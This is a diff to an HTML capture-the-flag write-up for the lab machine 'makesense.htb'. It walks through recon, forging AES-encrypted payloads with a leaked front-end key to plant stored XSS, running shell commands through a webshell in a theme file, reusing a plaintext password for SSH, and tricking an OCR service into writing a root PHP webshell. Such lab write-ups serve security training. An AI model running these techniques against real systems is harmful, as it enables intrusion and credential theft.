@@ -45,33 +45,25 @@
         </div>
 
         <div class="note-content">
-<h2>Reconnaissance</h2>
-<h3>Port scan</h3>
+<h2>1. Reconnaissance</h2>
+<h3>Ports Scan</h3>
 <pre><code>nmap -sV -sC -A -T4 --reason -oA nmap-result <span class="ph">&lt;target-ip&gt;</span></code></pre>
 
-<pre><code>PORT     STATE    SERVICE     REASON         VERSION
-22/tcp   open     ssh         syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   256 27:c3:7d:10:17:3b:dc:29:cf:05:83:33:ab:28:d0:38 (ECDSA)
-|_  256 a3:46:f2:d7:1f:43:41:31:35:a2:88:31:ff:2a:0b:22 (ED25519)
-80/tcp   filtered http        no-response
-443/tcp  open     ssl/http    syn-ack ttl 63 Apache httpd 2.4.58 ((Ubuntu))
-|_ssl-date: TLS randomness does not represent time
-|_http-server-header: Apache/2.4.58 (Ubuntu)
-| tls-alpn: 
-|_  http/1.1
-|_http-trane-info: Problem with XML parsing of /evox/about
-|_http-title: Agency LLC
-| ssl-cert: Subject: commonName=makesense.htb
-| Not valid before: 2026-05-29T16:37:29
-|_Not valid after:  2126-05-05T16:37:29
-|_http-generator: WordPress 7.0
-8001/tcp filtered vcom-tunnel no-response</code></pre>
+<p><strong>Open Ports:</strong></p>
+<ul>
+  <li><strong>22/tcp</strong> – SSH (OpenSSH 9.6p1 Ubuntu)</li>
+  <li><strong>80/tcp</strong> – filtered (no-response)</li>
+  <li><strong>443/tcp</strong> – HTTPS (Apache 2.4.58, WordPress 7.0, CN=<code>makesense.htb</code>)</li>
+  <li><strong>8001/tcp</strong> – filtered (internal OCR service later)</li>
+</ul>
 
-<p>Add hosts</p>
-<pre><code>echo &quot;<span class="ph">&lt;target-ip&gt;</span> makesense.htb&quot; | sudo tee -a /etc/hosts</code></pre>
+<div class="callout info">
+  <strong>💡 Info</strong>
+  Register the hostname from the SSL cert:
+  <pre><code>echo '<span class="ph">&lt;target-ip&gt;</span> makesense.htb' | sudo tee -a /etc/hosts</code></pre>
+</div>
 
-<h3>Web content discovery</h3>
+<h3>Web Content Discovery</h3>
 <pre><code>ffuf -u https://makesense.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -ignore-body -fs 0</code></pre>
 
 <p>The interesting hits:</p>
@@ -104,7 +96,7 @@ wp-content/ai-models/models/
 .cache/huggingface/</code></pre>
 
 <p>So the site uses client-side AI (Whisper) — this matches the homepage's "Call" button ("Ready to connect / Recording… / Speak your message after the beep").</p>
-<h3>WordPress enumeration</h3>
+<h3>WordPress Enumeration</h3>
 <pre><code>wpscan --url https://makesense.htb --disable-tls-checks</code></pre>
 
 <pre><code>[+] WordPress version 7.0 identified (Latest, released on 2026-05-20).
@@ -139,8 +131,8 @@ wp-content/ai-models/models/
 
 <p>Note the admin user's <code>url</code> field points at <code>http://localhost:8000</code> — a hint that there is a localhost service the admin cares about (the OCR4 service on <code>8001</code> turns out to be it).</p>
 <div class="callout info"><strong>Under the Hood</strong><p><code>wp/v2/users</code> is enabled by default on unauthenticated REST. Many hardened sites disable it; here it leaks the admin slug and that localhost hint.</p></div>
-<h2>Foothold — Stored XSS via a leaked AES key</h2>
-<h3>Reading the client-side AI pipeline</h3>
+<h2>2. Foothold — Stored XSS via a Leaked AES Key</h2>
+<h3>Reading the Client-Side AI Pipeline</h3>
 <p>The homepage loads three custom scripts:</p>
 <pre><code>&lt;script id=&quot;whisper-wrapper-js-extra&quot;&gt;
 var webagency_ajax = {&quot;ajax_url&quot;:&quot;https://makesense.htb/wp-admin/admin-ajax.php&quot;,&quot;nonce&quot;:&quot;4c58dec735&quot;,&quot;theme_url&quot;:&quot;https://makesense.htb/wp-content/themes/webagency&quot;,&quot;site_url&quot;:&quot;https://makesense.htb&quot;};
@@ -160,7 +152,7 @@ const ENCRYPTION_KEY = &#x27;bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI&#x27;;</code><
 
 <p>The intended UX is: user records audio → Whisper transcribes in-browser → text is summarized → the <code>{transcription, summary}</code> payload is AES-GCM encrypted with that key → POSTed to <code>admin-ajax.php?action=save_voice_results</code>. The server decrypts with the same key and stores the transcription in the <code>contact_submission</code> post's meta. An admin reviews submissions in <code>wp-admin/edit.php?post_type=contact_submission</code>, where the transcription is rendered <strong>unescaped</strong>.</p>
 <p>Because we have the key, we don't need to record audio at all — we can forge any encrypted payload ourselves.</p>
-<h3>The three AJAX actions</h3>
+<h3>The Three AJAX Actions</h3>
 <p>From <code>functions.php</code>:</p>
 <div style="overflow-x:auto;margin:1rem 0"><table style="width:100%;border-collapse:collapse;font-size:0.9rem">
 <tr>
@@ -184,7 +176,7 @@ const ENCRYPTION_KEY = &#x27;bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI&#x27;;</code><
 <td style="border:1px solid var(--border);padding:0.4rem 0.6rem;text-align:left">Decrypts <code>encrypted_payload</code>, stores <code>transcription</code>/<code>summary</code> in post meta</td>
 </tr>
 </table></div>
-<h3>Forging the encrypted transcription</h3>
+<h3>Forging the Encrypted Transcription</h3>
 <p>The JS encryption is straight WebCrypto AES-GCM: <code>key = SHA-256(ENCRYPTION_KEY)</code>, random 12-byte IV, output = <code>iv || ciphertext||tag</code> base64. We replicate it in Python:</p>
 <pre><code>nano encrypt_payload.py</code></pre>
 
@@ -312,8 +304,8 @@ curl -sk -X POST https://makesense.htb/wp-admin/admin-ajax.php \
 <pre><code>curl -sk &quot;https://makesense.htb/wp-content/themes/webagency/footer.php?1=id&quot;
 # uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
 
-<h2>Privilege Escalation</h2>
-<h3>SSH as `walter`</h3>
+<h2>3. Privilege Escalation</h2>
+<h3>SSH as <code>walter</code></h3>
 <p><code>wp-config.php</code> reveals a SQLite-backed WordPress with plaintext credentials:</p>
 <pre><code>curl -sk &quot;https://makesense.htb/wp-content/themes/webagency/footer.php?1=cd+../../..;+ls&quot;
 curl -sk &quot;https://makesense.htb/wp-content/themes/webagency/footer.php?1=cd+../../..;+cat+wp-config.php&quot;</code></pre>
@@ -333,7 +325,7 @@ define( &#x27;DB_COLLATE&#x27;, &#x27;&#x27; );</code></pre>
 walter@makesense:~$ id
 uid=1000(walter) gid=1000(walter) groups=1000(walter)</code></pre>
 
-<h3>A root PHP server on localhost:8001</h3>
+<h3>A Root PHP Server on localhost:8001</h3>
 <p>From walter's shell:</p>
 <pre><code>ss -tlnp</code></pre>
 
@@ -361,7 +353,7 @@ WWW-Authenticate: Basic realm=&quot;OCR Protected&quot;</code></pre>
 <p>Tunnel it locally so we can drive it comfortably:</p>
 <pre><code>sshpass -p &#x27;JbhHDAEgXvri3!&#x27; ssh -fN -L 8101:127.0.0.1:8001 walter@makesense.htb</code></pre>
 
-<h3>The OCR4 app</h3>
+<h3>The OCR4 App</h3>
 <p><code>http://127.0.0.1:8101/</code> is a canvas: draw a word, hit <strong>Recognize</strong>, tesseract reads it back, and a "Save as" form lets you write the recognized text into <code>saved/&lt;filename&gt;</code>:</p>
 <div class="note-image"><img src="../src/images/makesense/makesense-1.png" alt="Draw a text" onclick="toggleZoom(this)" onerror="this.parentElement.innerHTML='<em style=color:var(--text-muted)>[image: Pasted image 20260707191740.png]</em>'"></div>
 <div class="note-image"><img src="../src/images/makesense/makesense-2.png" alt="Recognized text" onclick="toggleZoom(this)" onerror="this.parentElement.innerHTML='<em style=color:var(--text-muted)>[image: Pasted image 20260707193637.png]</em>'"></div>
@@ -374,7 +366,7 @@ WWW-Authenticate: Basic realm=&quot;OCR Protected&quot;</code></pre>
 <p>Then, I'm trying the save in <code>.php</code></p>
 <div class="note-image"><img src="../src/images/makesense/makesense-3.png" alt="Save as PHP" onclick="toggleZoom(this)" onerror="this.parentElement.innerHTML='<em style=color:var(--text-muted)>[image: Pasted image 20260707194312.png]</em>'"></div>
 <p>It works, but <code>.php</code> is permitted, and the saved file lives inside the root server's webroot. The saved file's content is the tesseract-recognized text. So if we can get tesseract to read PHP, we write a root-executed webshell.</p>
-<h3>Making tesseract write PHP</h3>
+<h3>Making Tesseract Write PHP</h3>
 <p>Render the payload as a clean monospace image and let OCR do its job:</p>
 <pre><code>nano root_payload.py</code></pre>
 
@@ -414,9 +406,16 @@ uid=0(root) gid=0(root) groups=0(root)</code></pre>
 <span class="ph">&lt;user-flag&gt;</span>
 <span class="ph">&lt;root-flag&gt;</span></code></pre>
 
-<h2>Flag Path</h2>
-<pre><code>/home/walter/user.txt
-/root/root.txt</code></pre>
+<h2>4. Flag Paths</h2>
+<ul>
+  <li><strong>User flag:</strong> <code>/home/walter/user.txt</code></li>
+  <li><strong>Root flag:</strong> <code>/root/root.txt</code></li>
+</ul>
+
+<div class="callout info">
+  <strong>✅ Lessons Learned</strong>
+  Client-side secrets are not secrets — the Whisper AES key in theme JS let us forge encrypted transcriptions and land stored XSS on an admin bot. From there, theme-editor RCE as <code>www-data</code>, password reuse into SSH as <code>walter</code>, and a root PHP built-in server on <code>127.0.0.1:8001</code> turned OCR “save as .php” into a root webshell. Always review front-end crypto keys, bot-reviewed admin panels, and localhost services after a foothold.
+</div>
 
         </div>
       </div>
